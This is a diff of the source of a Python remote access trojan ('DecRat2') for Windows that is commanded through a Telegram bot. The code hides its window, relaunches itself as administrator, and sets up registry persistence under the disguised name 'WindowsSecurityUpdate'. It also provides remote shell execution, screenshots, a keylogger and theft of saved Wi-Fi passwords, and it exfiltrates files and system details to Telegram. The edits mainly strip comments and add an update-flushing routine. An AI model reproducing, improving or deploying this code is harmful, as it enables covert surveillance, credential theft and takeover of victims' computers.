@@ -18,14 +18,11 @@ last_update_id = 0
 kl_buf         = []
 kl_running     = False
 
-# ── Single instance ───────────────────────────────────────────
 def single_instance():
     mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\DecRat2_v2_mutex")
-    err   = ctypes.windll.kernel32.GetLastError()
-    if err == 183:  # ERROR_ALREADY_EXISTS
+    if ctypes.windll.kernel32.GetLastError() == 183:
         sys.exit(0)
 
-# ── Hide window + detach console ─────────────────────────────
 def hide():
     try:
         hwnd = ctypes.windll.kernel32.GetConsoleWindow()
@@ -34,7 +31,6 @@ def hide():
         ctypes.windll.kernel32.FreeConsole()
     except: pass
 
-# ── UAC: re-launch as admin if not already ───────────────────
 def ensure_admin():
     try:
         is_admin = ctypes.windll.shell32.IsUserAnAdmin()
@@ -45,14 +41,13 @@ def ensure_admin():
             ctypes.windll.shell32.ShellExecuteW(
                 None, "runas", sys.executable,
                 " ".join(f'"{a}"' for a in sys.argv),
-                None, 0  # SW_HIDE
+                None, 0
             )
         except: pass
         sys.exit(0)
 
-# ── Boot persistence (HKLM for admin, HKCU fallback) ─────────
 def install_persist():
-    exe = sys.executable
+    exe  = sys.executable
     name = "WindowsSecurityUpdate"
     try:
         k = winreg.OpenKey(
@@ -62,8 +57,7 @@ def install_persist():
         winreg.SetValueEx(k, name, 0, winreg.REG_SZ, exe)
         winreg.CloseKey(k)
         return "✅ persisted (HKLM)"
-    except:
-        pass
+    except: pass
     try:
         k = winreg.OpenKey(
             winreg.HKEY_CURRENT_USER,
@@ -75,13 +69,12 @@ def install_persist():
     except Exception as e:
         return f"❌ {e}"
 
-# ── Telegram helpers ──────────────────────────────────────────
 def tg_send(text):
     try:
         for i in range(0, len(text), 4000):
             requests.post(f"{API_URL}/sendMessage", json={
-                "chat_id": CHAT_ID,
-                "text":    text[i:i+4000],
+                "chat_id":    CHAT_ID,
+                "text":       text[i:i+4000],
                 "parse_mode": "HTML"
             }, timeout=10)
     except: pass
@@ -108,7 +101,18 @@ def tg_get_updates():
     except:
         return []
 
-# ── Telethon channel upload ───────────────────────────────────
+def flush_old_updates():
+    try:
+        r = requests.get(f"{API_URL}/getUpdates", params={
+            "offset":  -1,
+            "timeout":  2
+        }, timeout=10)
+        results = r.json().get("result", [])
+        if results:
+            return results[-1]["update_id"]
+    except: pass
+    return 0
+
 def channel_upload(filepath, caption=""):
     try:
         from telethon.sync import TelegramClient
@@ -142,7 +146,6 @@ def smart_send(filepath, caption=""):
     except Exception as e:
         tg_send(f"❌ smart_send: {e}")
 
-# ── Shell ─────────────────────────────────────────────────────
 def run_shell(cmd):
     try:
         r = subprocess.run(
@@ -154,7 +157,6 @@ def run_shell(cmd):
     except subprocess.TimeoutExpired: return "[timeout]"
     except Exception as e:            return f"[error: {e}]"
 
-# ── Screenshot (pure WinAPI, no deps) ────────────────────────
 def screenshot():
     try:
         import struct as st
@@ -181,24 +183,23 @@ def screenshot():
         buf = (ctypes.c_byte * bih.biSizeImage)()
         g.GetDIBits(hD, hB, 0, h, buf, ctypes.byref(bih), 0)
         hdr = 14 + ctypes.sizeof(BIH)
-        bmp = st.pack("<2sIHHI", b"BM", hdr+bih.biSizeImage,0,0,hdr)+bytes(bih)+bytes(buf)
+        bmp = st.pack("<2sIHHI",b"BM",hdr+bih.biSizeImage,0,0,hdr)+bytes(bih)+bytes(buf)
         g.DeleteObject(hB); g.DeleteDC(hD); u.ReleaseDC(None, hS)
         path = os.path.join(os.environ.get("TEMP","C:\\Windows\\Temp"), "ss.bmp")
         open(path, "wb").write(bmp)
         return path
     except: return None
 
-# ── Sysinfo ───────────────────────────────────────────────────
 def sysinfo():
-    admin = "✅ Admin" if ctypes.windll.shell32.IsUserAnAdmin() else "❌ User"
+    try:    admin = "✅ Admin" if ctypes.windll.shell32.IsUserAnAdmin() else "❌ User"
+    except: admin = "?"
     return (f"🖥 <b>SYSTEM INFO</b>\n"
-            f"OS:    {platform.system()} {platform.version()}\n"
-            f"Host:  {platform.node()}\n"
-            f"User:  {os.environ.get('USERNAME','?')}\n"
-            f"Arch:  {platform.machine()}\n"
-            f"Priv:  {admin}")
+            f"OS:   {platform.system()} {platform.version()}\n"
+            f"Host: {platform.node()}\n"
+            f"User: {os.environ.get('USERNAME','?')}\n"
+            f"Arch: {platform.machine()}\n"
+            f"Priv: {admin}")
 
-# ── Keylogger ─────────────────────────────────────────────────
 def kl_start():
     global kl_running
     if kl_running: return "already running"
@@ -214,49 +215,31 @@ def kl_start():
     threading.Thread(target=_r, daemon=True).start()
     return "✅ keylogger started"
 
-# ── Command handler ───────────────────────────────────────────
 def handle(text):
     t = text.strip()
-
     if t in ("/start", "/help"):
         return ("📋 <b>Commands</b>\n\n"
-                "/ping — check alive\n"
-                "/sysinfo — system info\n"
-                "/screenshot — capture screen\n"
-                "/shell &lt;cmd&gt; — run command\n"
-                "/download &lt;path&gt; — get file\n"
-                "/channel &lt;path&gt; — force channel upload\n"
+                "/ping\n/sysinfo\n/screenshot\n"
+                "/shell &lt;cmd&gt;\n"
+                "/download &lt;path&gt;\n"
+                "/channel &lt;path&gt;\n"
                 "/keylog_start | /keylog_dump | /keylog_stop\n"
-                "/persist — install autostart\n"
-                "/ip — ipconfig\n"
-                "/wifi — saved wifi passwords\n"
-                "/ps — process list\n"
-                "/users — local users")
-
+                "/persist\n/ip\n/wifi\n/ps\n/users")
     elif t == "/ping":
         return f"🟢 alive — {platform.node()}"
-
     elif t == "/sysinfo":
         return sysinfo()
-
     elif t == "/screenshot":
         p = screenshot()
-        if p:
-            smart_send(p, "📸 screenshot")
-            return None
+        if p: smart_send(p, "📸 screenshot"); return None
         return "❌ screenshot failed"
-
     elif t.startswith("/shell "):
         cmd = t[7:]
-        out = run_shell(cmd)
-        return f"<code>{cmd}</code>\n\n{out}"
-
+        return f"<code>{cmd}</code>\n\n{run_shell(cmd)}"
     elif t.startswith("/download "):
         p = t[10:].strip()
         if not os.path.exists(p): return f"❌ not found: {p}"
-        smart_send(p, f"📁 {os.path.basename(p)}")
-        return None
-
+        smart_send(p, f"📁 {os.path.basename(p)}"); return None
     elif t.startswith("/channel "):
         p = t[9:].strip()
         if not os.path.exists(p): return f"❌ not found: {p}"
@@ -264,20 +247,16 @@ def handle(text):
         tg_send(f"📤 {os.path.basename(p)} ({mb:.1f}MB) → {CHANNEL}...")
         ok = channel_upload(p, f"📁 {os.path.basename(p)}")
         return f"✅ check {CHANNEL}" if ok else "❌ failed"
-
     elif t == "/keylog_start": return kl_start()
     elif t == "/keylog_dump":
         d = "".join(kl_buf); kl_buf.clear()
         return f"<b>Keylog:</b>\n<code>{d or '[empty]'}</code>"
     elif t == "/keylog_stop":
         kl_running = False; return "⏹ stopped"
-
     elif t == "/persist":
         return install_persist()
-
     elif t == "/ip":
         return run_shell("ipconfig /all")
-
     elif t == "/wifi":
         p = run_shell("netsh wlan show profiles")
         names = [l.split(":")[-1].strip()
@@ -289,16 +268,12 @@ def handle(text):
                 if "Key Content" in l:
                     r += f"{n}: {l.split(':')[-1].strip()}\n"
         return r or "no saved passwords"
-
     elif t == "/ps":
         return run_shell("tasklist")
-
     elif t == "/users":
         return run_shell("net user")
-
     return None
 
-# ── Main ──────────────────────────────────────────────────────
 def main():
     single_instance()
     ensure_admin()
@@ -306,6 +281,9 @@ def main():
 
     global last_update_id
     time.sleep(2)
+
+    last_update_id = flush_old_updates()
+
     tg_send(f"🟢 Agent connected\n{sysinfo()}\n📡 {CHANNEL}")
 
     while True:
